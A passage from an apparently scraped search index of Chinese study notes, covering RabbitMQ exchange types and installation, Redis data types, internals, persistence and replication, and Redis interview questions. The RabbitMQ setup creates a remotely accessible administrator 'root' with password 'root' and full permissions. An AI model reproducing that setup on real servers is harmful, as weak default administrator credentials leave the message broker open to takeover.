headers，不同类型的Exchange转发消息的策略有所区别。这个会在介绍 Exchange Types(交换器类型) 的时候介绍到。\nExchange(交换器) 示意图如下：\n生产者将消息发给交换器的时候，一般会指定一个 RoutingKey(路由键)，用来指定这个消息的路由规则，而这个 RoutingKey 需要与交换器类型和绑定键(BindingKey)联合使用才能最终生效。\nRabbitMQ 中通过 Binding(绑定) 将 Exchange(交换器) 与 Queue(消息队列) 关联起来，在绑定的时候一般会指定一个 BindingKey(绑定建) ,这样 RabbitMQ 就知道如何正确将消息路由到队列了,如下图所示。一个绑定就是基于路由键将交换器和消息队列连接起来的路由规则，所以可以将交换器理解成一个由绑定构成的路由表。Exchange 和 Queue 的绑定可以是多对多的关系。\nBinding(绑定) 示意图：\n生产者将消息发送给交换器时，需要一个RoutingKey,当 BindingKey 和 RoutingKey 相匹配时，消息会被路由到对应的队列中。在绑定多个队列到同一个交换器的时候，这些绑定允许使用相同的 BindingKey。BindingKey 并不是在所有的情况下都生效，它依赖于交换器类型，比如fanout类型的交换器就会无视，而是将消息路由到所有绑定到该交换器的队列中。\n1.2.3 Queue(消息队列)    Queue(消息队列) 用来保存消息直到发送给消费者。它是消息的容器，也是消息的终点。一个消息可投入一个或多个队列。消息一直在队列里面，等待消费者连接到这个队列将其取走。\nRabbitMQ 中消息只能存储在 队列 中，这一点和 Kafka 这种消息中间件相反。Kafka 将消息存储在 topic（主题） 这个逻辑层面，而相对应的队列逻辑只是topic实际存储文件中的位移标识。 RabbitMQ 的生产者生产消息并最终投递到队列中，消费者可以从队列中获取消息并消费。\n多个消费者可以订阅同一个队列，这时队列中的消息会被平均分摊（Round-Robin，即轮询）给多个消费者进行处理，而不是每个消费者都收到所有的消息并处理，这样避免消息被重复消费。\nRabbitMQ 不支持队列层面的广播消费,如果有广播消费的需求，需要在其上进行二次开发,这样会很麻烦，不建议这样做。\n1.2.4 Broker（消息中间件的服务节点）    对于 RabbitMQ 来说，一个 RabbitMQ Broker 可以简单地看作一个 RabbitMQ 服务节点，或者RabbitMQ服务实例。大多数情况下也可以将一个 RabbitMQ Broker 看作一台 RabbitMQ 服务器。\n下图展示了生产者将消息存入 RabbitMQ Broker,以及消费者从Broker中消费数据的整个流程。\n这样图1中的一些关于 RabbitMQ 的基本概念我们就介绍完毕了，下面再来介绍一下 Exchange Types(交换器类型) 。\n1.2.5 Exchange Types(交换器类型)    RabbitMQ 常用的 Exchange Type 有 fanout、direct、topic、headers 这四种（AMQP规范里还提到两种 Exchange Type，分别为 system 与 自定义，这里不予以描述）。\n① fanout    fanout 类型的Exchange路由规则非常简单，它会把所有发送到该Exchange的消息路由到所有与它绑定的Queue中，不需要做任何判断操作，所以 fanout 类型是所有的交换机类型里面速度最快的。fanout 类型常用来广播消息。\n② direct    direct 类型的Exchange路由规则也很简单，它会把消息路由到那些 Bindingkey 与 RoutingKey 完全匹配的 Queue 中。\n以上图为例，如果发送消息的时候设置路由键为“warning”,那么消息会路由到 Queue1 和 Queue2。如果在发送消息的时候设置路由键为\u0026quot;Info”或者\u0026quot;debug”，消息只会路由到Queue2。如果以其他的路由键发送消息，则消息不会路由到这两个队列中。\ndirect 类型常用在处理有优先级的任务，根据任务的优先级把消息发送到对应的队列，这样可以指派更多的资源去处理高优先级的队列。\n③ topic    前面讲到direct类型的交换器路由规则是完全匹配 BindingKey 和 RoutingKey ，但是这种严格的匹配方式在很多情况下不能满足实际业务的需求。topic类型的交换器在匹配规则上进行了扩展，它与 direct 类型的交换器相似，也是将消息路由到 BindingKey 和 RoutingKey 相匹配的队列中，但这里的匹配规则有些不同，它约定：\n RoutingKey 为一个点号“．”分隔的字符串（被点号“．”分隔开的每一段独立的字符串称为一个单词），如 “com.rabbitmq.client”、“java.util.concurrent”、“com.hidden.client”; BindingKey 和 RoutingKey 一样也是点号“．”分隔的字符串； BindingKey 中可以存在两种特殊字符串“*”和“#”，用于做模糊匹配，其中“*”用于匹配一个单词，“#”用于匹配多个单词(可以是零个)。  以上图为例：\n 路由键为 “com.rabbitmq.client” 的消息会同时路由到 Queue1 和 Queue2; 路由键为 “com.hidden.client” 的消息只会路由到 Queue2 中； 路由键为 “com.hidden.demo” 的消息只会路由到 Queue2 中； 路由键为 “java.rabbitmq.demo” 的消息只会路由到 Queue1 中； 路由键为 “java.util.concurrent” 的消息将会被丢弃或者返回给生产者（需要设置 mandatory 参数），因为它没有匹配任何路由键。  ④ headers(不推荐)    headers 类型的交换器不依赖于路由键的匹配规则来路由消息，而是根据发送的消息内容中的 headers 属性进行匹配。在绑定队列和交换器时指定一组键值对，当发送消息到交换器时，RabbitMQ会获取到该消息的 headers（也是一个键值对的形式)，对比其中的键值对是否完全匹配队列和交换器绑定时指定的键值对，如果完全匹配则消息会路由到该队列，否则不会路由到该队列。headers 类型的交换器性能会很差，而且也不实用，基本上不会看到它的存在。\n二 安装 RabbitMQ    通过 Docker 安装非常方便，只需要几条命令就好了，我这里是只说一下常规安装方法。\n前面提到了 RabbitMQ 是由 Erlang语言编写的，也正因如此，在安装RabbitMQ 之前需要安装 Erlang。\n注意：在安装 RabbitMQ 的时候需要注意 RabbitMQ 和 Erlang 的版本关系，如果不注意的话会导致出错，两者对应关系如下:\n2.1 安装 erlang    1 下载 erlang 安装包\n在官网下载然后上传到 Linux 上或者直接使用下面的命令下载对应的版本。\n[root@SnailClimb local]#wget https://erlang.org/download/otp_src_19.3.tar.gz erlang 官网下载：https://www.erlang.org/downloads\n2 解压 erlang 安装包\n[root@SnailClimb local]#tar -xvzf otp_src_19.3.tar.gz 3 删除 erlang 安装包\n[root@SnailClimb local]#rm -rf otp_src_19.3.tar.gz 4 安装 erlang 的依赖工具\n[root@SnailClimb local]#yum -y install make gcc gcc-c++ kernel-devel m4 ncurses-devel openssl-devel unixODBC-devel 5 进入erlang 安装包解压文件对 erlang 进行安装环境的配置\n新建一个文件夹\n[root@SnailClimb local]# mkdir erlang 对 erlang 进行安装环境的配置\n[root@SnailClimb otp_src_19.3]#  ./configure --prefix=/usr/local/erlang --without-javac 6 编译安装\n[root@SnailClimb otp_src_19.3]#  make \u0026amp;\u0026amp; make install 7 验证一下 erlang 是否安装成功了\n[root@SnailClimb otp_src_19.3]# ./bin/erl 运行下面的语句输出“hello world”\nio:format(\u0026#34;hello world~n\u0026#34;, []). 大功告成，我们的 erlang 已经安装完成。\n8 配置 erlang 环境变量\n[root@SnailClimb etc]# vim profile 追加下列环境变量到文件末尾\n#erlang ERL_HOME=/usr/local/erlang PATH=$ERL_HOME/bin:$PATH export ERL_HOME PATH 运行下列命令使配置文件profile生效\n[root@SnailClimb etc]# source /etc/profile 输入 erl 查看 erlang 环境变量是否配置正确\n[root@SnailClimb etc]# erl 2.2 安装 RabbitMQ    1. 下载rpm\nwget https://www.rabbitmq.com/releases/rabbitmq-server/v3.6.8/rabbitmq-server-3.6.8-1.el7.noarch.rpm 或者直接在官网下载\nhttps://www.rabbitmq.com/install-rpm.html\n2. 安装rpm\nrpm --import https://www.rabbitmq.com/rabbitmq-release-signing-key.asc 紧接着执行：\nyum install rabbitmq-server-3.6.8-1.el7.noarch.rpm 中途需要你输入\u0026quot;y\u0026quot;才能继续安装。\n3 开启 web 管理插件\nrabbitmq-plugins enable rabbitmq_management 4 设置开机启动\nchkconfig rabbitmq-server on 5. 启动服务\nservice rabbitmq-server start 6. 查看服务状态\nservice rabbitmq-server status 7. 访问 RabbitMQ 控制台\n浏览器访问：http://你的ip地址:15672/\n默认用户名和密码：guest/guest; 但是需要注意的是：guest用户只是被容许从localhost访问。官网文档描述如下：\n“guest” user can only connect via localhost 解决远程访问 RabbitMQ 远程访问密码错误\n新建用户并授权\n[root@SnailClimb rabbitmq]# rabbitmqctl add_user root root Creating user \u0026#34;root\u0026#34; ... [root@SnailClimb rabbitmq]# rabbitmqctl set_user_tags root administrator Setting tags for user \u0026#34;root\u0026#34; to [administrator] ... [root@SnailClimb rabbitmq]#  [root@SnailClimb rabbitmq]# rabbitmqctl set_permissions -p / root \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; Setting permissions for user \u0026#34;root\u0026#34; in vhost \u0026#34;/\u0026#34; ... 再次访问:http://你的ip地址:15672/ ,输入用户名和密码：root root\n"},{"id":277,"href":"/%E7%AC%94%E8%AE%B0/Redis/","title":"Redis","parent":"笔记","content":"Redis     Redis  一、概述 二、数据类型  STRING LIST SET HASH ZSET   三、数据结构  字典 跳跃表   四、使用场景  计数器 缓存 查找表 消息队列 会话缓存 分布式锁实现 其它   五、Redis 与 Memcached  数据类型 数据持久化 分布式 内存管理机制   六、键的过期时间 七、数据淘汰策略 八、持久化  RDB 持久化 AOF 持久化   九、事务 十、事件  文件事件 时间事件 事件的调度与执行   十一、复制  连接过程 主从链   十二、Sentinel 十三、分片 十四、一个简单的论坛系统分析  文章信息 点赞功能 对文章进行排序   参考资料    一、概述    Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。\n键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。\nRedis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。\n二、数据类型       数据类型 可以存储的值 操作     STRING 字符串、整数或者浮点数 对整个字符串或者字符串的其中一部分执行操作\u0026lt;/br\u0026gt; 对整数和浮点数执行自增或者自减操作   LIST 列表 从两端压入或者弹出元素 \u0026lt;/br\u0026gt; 对单个或者多个元素进行修剪，\u0026lt;/br\u0026gt; 只保留一个范围内的元素   SET 无序集合 添加、获取、移除单个元素\u0026lt;/br\u0026gt; 检查一个元素是否存在于集合中\u0026lt;/br\u0026gt; 计算交集、并集、差集\u0026lt;/br\u0026gt; 从集合里面随机获取元素   HASH 包含键值对的无序散列表 添加、获取、移除单个键值对\u0026lt;/br\u0026gt; 获取所有键值对\u0026lt;/br\u0026gt; 检查某个键是否存在   ZSET 有序集合 添加、获取、删除元素\u0026lt;/br\u0026gt; 根据分值范围或者成员来获取元素\u0026lt;/br\u0026gt; 计算一个键的排名     What Redis data structures look like\n STRING    \n\u0026gt; set hello world OK \u0026gt; get hello \u0026#34;world\u0026#34; \u0026gt; del hello (integer) 1 \u0026gt; get hello (nil) LIST    \n\u0026gt; rpush list-key item (integer) 1 \u0026gt; rpush list-key item2 (integer) 2 \u0026gt; rpush list-key item (integer) 3 \u0026gt; lrange list-key 0 -1 1) \u0026#34;item\u0026#34; 2) \u0026#34;item2\u0026#34; 3) \u0026#34;item\u0026#34; \u0026gt; lindex list-key 1 \u0026#34;item2\u0026#34; \u0026gt; lpop list-key \u0026#34;item\u0026#34; \u0026gt; lrange list-key 0 -1 1) \u0026#34;item2\u0026#34; 2) \u0026#34;item\u0026#34; SET    \n\u0026gt; sadd set-key item (integer) 1 \u0026gt; sadd set-key item2 (integer) 1 \u0026gt; sadd set-key item3 (integer) 1 \u0026gt; sadd set-key item (integer) 0 \u0026gt; smembers set-key 1) \u0026#34;item\u0026#34; 2) \u0026#34;item2\u0026#34; 3) \u0026#34;item3\u0026#34; \u0026gt; sismember set-key item4 (integer) 0 \u0026gt; sismember set-key item (integer) 1 \u0026gt; srem set-key item2 (integer) 1 \u0026gt; srem set-key item2 (integer) 0 \u0026gt; smembers set-key 1) \u0026#34;item\u0026#34; 2) \u0026#34;item3\u0026#34; HASH    \n\u0026gt; hset hash-key sub-key1 value1 (integer) 1 \u0026gt; hset hash-key sub-key2 value2 (integer) 1 \u0026gt; hset hash-key sub-key1 value1 (integer) 0 \u0026gt; hgetall hash-key 1) \u0026#34;sub-key1\u0026#34; 2) \u0026#34;value1\u0026#34; 3) \u0026#34;sub-key2\u0026#34; 4) \u0026#34;value2\u0026#34; \u0026gt; hdel hash-key sub-key2 (integer) 1 \u0026gt; hdel hash-key sub-key2 (integer) 0 \u0026gt; hget hash-key sub-key1 \u0026#34;value1\u0026#34; \u0026gt; hgetall hash-key 1) \u0026#34;sub-key1\u0026#34; 2) \u0026#34;value1\u0026#34; ZSET    \n\u0026gt; zadd zset-key 728 member1 (integer) 1 \u0026gt; zadd zset-key 982 member0 (integer) 1 \u0026gt; zadd zset-key 982 member0 (integer) 0 \u0026gt; zrange zset-key 0 -1 withscores 1) \u0026#34;member1\u0026#34; 2) \u0026#34;728\u0026#34; 3) \u0026#34;member0\u0026#34; 4) \u0026#34;982\u0026#34; \u0026gt; zrangebyscore zset-key 0 800 withscores 1) \u0026#34;member1\u0026#34; 2) \u0026#34;728\u0026#34; \u0026gt; zrem zset-key member1 (integer) 1 \u0026gt; zrem zset-key member1 (integer) 0 \u0026gt; zrange zset-key 0 -1 withscores 1) \u0026#34;member0\u0026#34; 2) \u0026#34;982\u0026#34; 三、数据结构    字典    dictht 是一个散列表结构，使用拉链法解决哈希冲突。\n/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. */ typedef struct dictht { dictEntry **table; unsigned long size; unsigned long sizemask; unsigned long used; } dictht; typedef struct dictEntry { void *key; union { void *val; uint64_t u64; int64_t s64; double d; } v; struct dictEntry *next; } dictEntry; Redis 的字典 dict 中包含两个哈希表 dictht，这是为了方便进行 rehash 操作。在扩容时，将其中一个 dictht 上的键值对 rehash 到另一个 dictht 上面，完成之后释放空间并交换两个 dictht 的角色。\ntypedef struct dict { dictType *type; void *privdata; dictht ht[2]; long rehashidx; /* rehashing not in progress if rehashidx == -1 */ unsigned long iterators; /* number of iterators currently running */ } dict; rehash 操作不是一次性完成，而是采用渐进方式，这是为了避免一次性执行过多的 rehash 操作给服务器带来过大的负担。\n渐进式 rehash 通过记录 dict 的 rehashidx 完成，它从 0 开始，然后每执行一次 rehash 都会递增。例如在一次 rehash 中，要把 dict[0] rehash 到 dict[1]，这一次会把 dict[0] 上 table[rehashidx] 的键值对 rehash 到 dict[1] 上，dict[0] 的 table[rehashidx] 指向 null，并令 rehashidx++。\n在 rehash 期间，每次对字典执行添加、删除、查找或者更新操作时，都会执行一次渐进式 rehash。\n采用渐进式 rehash 会导致字典中的数据分散在两个 dictht 上，因此对字典的查找操作也需要到对应的 dictht 去执行。\n/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */ int dictRehash(dict *d, int n) { int empty_visits = n * 10; /* Max number of empty buckets to visit. */ if (!dictIsRehashing(d)) return 0; while (n-- \u0026amp;\u0026amp; d-\u0026gt;ht[0].used != 0) { dictEntry *de, *nextde; /* Note that rehashidx can\u0026#39;t overflow as we are sure there are more * elements because ht[0].used != 0 */ assert(d-\u0026gt;ht[0].size \u0026gt; (unsigned long) d-\u0026gt;rehashidx); while (d-\u0026gt;ht[0].table[d-\u0026gt;rehashidx] == NULL) { d-\u0026gt;rehashidx++; if (--empty_visits == 0) return 1; } de = d-\u0026gt;ht[0].table[d-\u0026gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ while (de) { uint64_t h; nextde = de-\u0026gt;next; /* Get the index in the new hash table */ h = dictHashKey(d, de-\u0026gt;key) \u0026amp; d-\u0026gt;ht[1].sizemask; de-\u0026gt;next = d-\u0026gt;ht[1].table[h]; d-\u0026gt;ht[1].table[h] = de; d-\u0026gt;ht[0].used--; d-\u0026gt;ht[1].used++; de = nextde; } d-\u0026gt;ht[0].table[d-\u0026gt;rehashidx] = NULL; d-\u0026gt;rehashidx++; } /* Check if we already rehashed the whole table... */ if (d-\u0026gt;ht[0].used == 0) { zfree(d-\u0026gt;ht[0].table); d-\u0026gt;ht[0] = d-\u0026gt;ht[1]; _dictReset(\u0026amp;d-\u0026gt;ht[1]); d-\u0026gt;rehashidx = -1; return 0; } /* More to rehash... */ return 1; } 跳跃表    是有序集合的底层实现之一。\n跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。\n\n在查找时，从上层指针开始查找，找到对应的区间之后再到下一层去查找。下图演示了查找 22 的过程。\n\n与红黑树等平衡树相比，跳跃表具有以下优点：\n 插入速度非常快速，因为不需要进行旋转等操作来维护平衡性； 更容易实现； 支持无锁操作。  四、使用场景    计数器    可以对 String 进行自增自减运算，从而实现计数器功能。\nRedis 这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。\n缓存    将热点数据放到内存中，设置内存的最大使用量以及淘汰策略来保证缓存的命中率。\n查找表    例如 DNS 记录就很适合使用 Redis 进行存储。\n查找表和缓存类似，也是利用了 Redis 快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。\n消息队列    List 是一个双向链表，可以通过 lpush 和 rpop 写入和读取消息\n不过最好使用 Kafka、RabbitMQ 等消息中间件。\n会话缓存    可以使用 Redis 来统一存储多台应用服务器的会话信息。\n当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。\n分布式锁实现    在分布式场景下，无法使用单机环境下的锁来对多个节点上的进程进行同步。\n可以使用 Redis 自带的 SETNX 命令实现分布式锁，除此之外，还可以使用官方提供的 RedLock 分布式锁实现。\n其它    Set 可以实现交集、并集等操作，从而实现共同好友等功能。\nZSet 可以实现有序性操作，从而实现排行榜等功能。\n五、Redis 与 Memcached    两者都是非关系型内存键值数据库，主要有以下不同：\n数据类型    Memcached 仅支持字符串类型，而 Redis 支持五种不同的数据类型，可以更灵活地解决问题。\n数据持久化    Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。\n分布式    Memcached 不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。\nRedis Cluster 实现了分布式的支持。\n内存管理机制      在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘，而 Memcached 的数据则会一直在内存中。\n  Memcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题。但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。\n  六、键的过期时间    Redis 可以为每个键设置过期时间，当键过期时，会自动删除该键。\n对于散列表这种容器，只能为整个键设置过期时间（整个散列表），而不能为键里面的单个元素设置过期时间。\n七、数据淘汰策略    可以设置内存最大使用量，当内存使用量超出时，会施行数据淘汰策略。\nRedis 具体有 6 种淘汰策略：\n   策略 描述     volatile-lru 从已设置过期时间的数据集中挑选最近最少使用的数据淘汰   volatile-ttl 从已设置过期时间的数据集中挑选将要过期的数据淘汰   volatile-random 从已设置过期时间的数据集中任意选择数据淘汰   allkeys-lru 从所有数据集中挑选最近最少使用的数据淘汰   allkeys-random 从所有数据集中任意选择数据进行淘汰   noeviction 禁止驱逐数据    作为内存数据库，出于对性能和内存消耗的考虑，Redis 的淘汰算法实际实现上并非针对所有 key，而是抽样一小部分并且从中选出被淘汰的 key。\n使用 Redis 缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据。可以将内存最大使用量设置为热点数据占用的内存量，然后启用 allkeys-lru 淘汰策略，将最近最少使用的数据淘汰。\nRedis 4.0 引入了 volatile-lfu 和 allkeys-lfu 淘汰策略，LFU 策略通过统计访问频率，将访问频率最少的键值对淘汰。\n八、持久化    Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。\nRDB 持久化    将某个时间点的所有数据都存放到硬盘上。\n可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。\n如果系统发生故障，将会丢失最后一次创建快照之后的数据。\n如果数据量很大，保存快照的时间会很长。\nAOF 持久化    将写命令添加到 AOF 文件（Append Only File）的末尾。\n使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项：\n   选项 同步频率     always 每个写命令都同步   everysec 每秒同步一次   no 让操作系统来决定何时同步     always 选项会严重减低服务器的性能； everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响； no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。  随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。\n九、事务    一个事务包含了多个命令，服务器在执行事务期间，不会改去执行其它客户端的命令请求。\n事务中的多个命令被一次性发送给服务器，而不是一条一条发送，这种方式被称为流水线，它可以减少客户端与服务器之间的网络通信次数从而提升性能。\nRedis 最简单的事务实现方式是使用 MULTI 和 EXEC 命令将事务操作包围起来。\n十、事件    Redis 服务器是一个事件驱动程序。\n文件事件    服务器通过套接字与客户端或者其它服务器进行通信，文件事件就是对套接字操作的抽象。\nRedis 基于 Reactor 模式开发了自己的网络事件处理器，使用 I/O 多路复用程序来同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用相应的事件处理器。\n\n时间事件    服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。\n时间事件又分为：\n 定时事件：是让一段程序在指定的时间之内执行一次； 周期性事件：是让一段程序每隔指定时间就执行一次。  Redis 将所有时间事件都放在一个无序链表中，通过遍历整个链表查找出已到达的时间事件，并调用相应的事件处理器。\n事件的调度与执行    服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。\n事件调度与执行由 aeProcessEvents 函数负责，伪代码如下：\ndef aeProcessEvents(): # 获取到达时间离当前时间最接近的时间事件 time_event = aeSearchNearestTimer() # 计算最接近的时间事件距离到达还有多少毫秒 remaind_ms = time_event.when - unix_ts_now() # 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0 if remaind_ms \u0026lt; 0: remaind_ms = 0 # 根据 remaind_ms 的值，创建 timeval timeval = create_timeval_with_ms(remaind_ms) # 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定 aeApiPoll(timeval) # 处理所有已产生的文件事件 procesFileEvents() # 处理所有已到达的时间事件 processTimeEvents() 将 aeProcessEvents 函数置于一个循环里面，加上初始化和清理函数，就构成了 Redis 服务器的主函数，伪代码如下：\ndef main(): # 初始化服务器 init_server() # 一直处理事件，直到服务器关闭为止 while server_is_not_shutdown(): aeProcessEvents() # 服务器关闭，执行清理操作 clean_server() 从事件处理的角度来看，服务器运行流程如下：\n\n十一、复制    通过使用 slaveof host port 命令来让一个服务器成为另一个服务器的从服务器。\n一个从服务器只能有一个主服务器，并且不支持主主复制。\n连接过程      主服务器创建快照文件，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令；\n  从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令；\n  主服务器每执行一次写命令，就向从服务器发送相同的写命令。\n  主从链    随着负载不断上升，主服务器可能无法很快地更新所有从服务器，或者重新连接和重新同步从服务器将导致系统超载。为了解决这个问题，可以创建一个中间层来分担主服务器的复制工作。中间层的服务器是最上层服务器的从服务器，又是最下层服务器的主服务器。\n\n十二、Sentinel    Sentinel（哨兵）可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。\n十三、分片    分片是将数据划分为多个部分的方法，可以将数据存储到多台机器里面，这种方法在解决某些问题时可以获得线性级别的性能提升。\n假设有 4 个 Redis 实例 R0，R1，R2，R3，还有很多表示用户的键 user:1，user:2，\u0026hellip; ，有不同的方式来选择一个指定的键存储在哪个实例中。\n 最简单的方式是范围分片，例如用户 id 从 0~1000 的存储到实例 R0 中，用户 id 从 1001~2000 的存储到实例 R1 中，等等。但是这样需要维护一张映射范围表，维护操作代价很高。 还有一种方式是哈希分片，使用 CRC32 哈希函数将键转换为一个数字，再对实例数量求模就能知道应该存储的实例。  根据执行分片的位置，可以分为三种分片方式：\n 客户端分片：客户端使用一致性哈希等算法决定键应当分布到哪个节点。 代理分片：将客户端请求发送到代理上，由代理转发请求到正确的节点上。 服务器分片：Redis Cluster。  十四、一个简单的论坛系统分析    该论坛系统功能如下：\n 可以发布文章； 可以对文章进行点赞； 在首页可以按文章的发布时间或者文章的点赞数进行排序显示。  文章信息    文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。\nRedis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。\n\n点赞功能    当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。\n为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。\n\n对文章进行排序    为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的）\n\n参考资料     Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013. 黄健宏. Redis 设计与实现 [M]. 机械工业出版社, 2014. REDIS IN ACTION Skip Lists: Done Right 论述 Redis 和 Memcached 的差异 Redis 3.0 中文版- 分片 Redis 应用场景 Using Redis as an LRU cache  "},{"id":278,"href":"/database/Redis/redis-all/","title":"redis-all","parent":"Redis","content":"简单介绍一下 Redis 呗!    简单来说 Redis 就是一个使用 C 语言开发的数据库，不过与传统数据库不同的是 Redis 的数据是存在内存中的 ，也就是它是内存数据库，所以读写速度非常快，因此 Redis 被广泛应用于缓存方向。\n另外，Redis 除了做缓存之外，也经常用来做分布式锁，甚至是消息队列。\nRedis 提供了多种数据类型来支持不同的业务场景。Redis 还支持事务 、持久化、Lua 脚本、多种集群方案。\n分布式缓存常见的技术选型方案有哪些？    分布式缓存的话，使用的比较多的主要是 Memcached 和 Redis。不过，现在基本没有看过还有项目使用 Memcached 来做缓存，都是直接用 Redis。\nMemcached 是分布式缓存最开始兴起的那会，比较常用的。后来，随着 Redis 的发展，大家慢慢都转而使用更加强大的 Redis 了。\n分布式缓存主要解决的是单机缓存的容量受服务器限制并且无法保存通用信息的问题。因为，本地缓存只在当前服务里有效，比如如果你部署了两个相同的服务，他们两者之间的缓存数据是无法共同的。\n说一下 Redis 和 Memcached 的区别和共同点    现在公司一般都是用 Redis 来实现缓存，而且 Redis 自身也越来越强大了！不过，了解 Redis 和 Memcached 的区别和共同点，有助于我们在做相应的技术选型的时候，能够做到有理有据！\n共同点 ：\n 都是基于内存的数据库，一般都用来当做缓存使用。 都有过期策略。 两者的性能都非常高。  区别 ：\n Redis 支持更丰富的数据类型（支持更复杂的应用场景）。Redis 不仅仅支持简单的 k/v 类型的数据，同时还提供 list，set，zset，hash 等数据结构的存储。Memcached 只支持最简单的 k/v 数据类型。 Redis 支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用,而 Memecache 把数据全部存在内存之中。 Redis 有灾难恢复机制。 因为可以把缓存中的数据持久化到磁盘上。 Redis 在服务器内存使用完之后，可以将不用的数据放到磁盘上。但是，Memcached 在服务器内存使用完之后，就会直接报异常。 Memcached 没有原生的集群模式，需要依靠客户端来实现往集群中分片写入数据；但是 Redis 目前是原生支持 cluster 模式的。 Memcached 是多线程，非阻塞 IO 复用的网络模型；Redis 使用单线程的多路 IO 复用模型。 （Redis 6.0 引入了多线程 IO ） Redis 支持发布订阅模型、Lua 脚本、事务等功能，而 Memcached 不支持。并且，Redis 支持更多的编程语言。 Memcached 过期数据的删除策略只用了惰性删除，而 Redis 同时使用了惰性删除与定期删除。  相信看了上面的对比之后，我们已经没有什么理由可以选择使用 Memcached 来作为自己项目的分布式缓存了。\n缓存数据的处理流程是怎样的？    作为暖男一号，我给大家画了一个草图。\n简单来说就是:\n 如果用户请求的数据在缓存中就直接返回。 缓存中不存在的话就看数据库中是否存在。 数据库中存在的话就更新缓存中的数据。 数据库中不存在的话就返回空数据。  为什么要用 Redis/为什么要用缓存？    简单，来说使用缓存主要是为了提升用户体验以及应对更多的用户。\n下面我们主要从“高性能”和“高并发”这两点来看待这个问题。\n高性能 ：\n对照上面 👆 我画的图。我们设想这样的场景：\n假如用户第一次访问数据库中的某些数据的话，这个过程是比较慢，毕竟是从硬盘中读取的。但是，如果说，用户访问的数据属于高频数据并且不会经常改变的话，那么我们就可以很放心地将该用户访问的数据存在缓存中。\n这样有什么好处呢？ 那就是保证用户下一次再访问这些数据的时候就可以直接从缓存中获取了。操作缓存就是直接操作内存，所以速度相当快。\n不过，要保持数据库和缓存中的数据的一致性。 如果数据库中的对应数据改变的之后，同步改变缓存中相应的数据即可！\n高并发：\n一般像 MySQL 这类的数据库的 QPS 大概都在 1w 左右（4 核 8g） ，但是使用 Redis 缓存之后很容易达到 10w+，甚至最高能达到 30w+（就单机 redis 的情况，redis 集群的话会更高）。\n QPS（Query Per Second）：服务器每秒可以执行的查询次数；\n 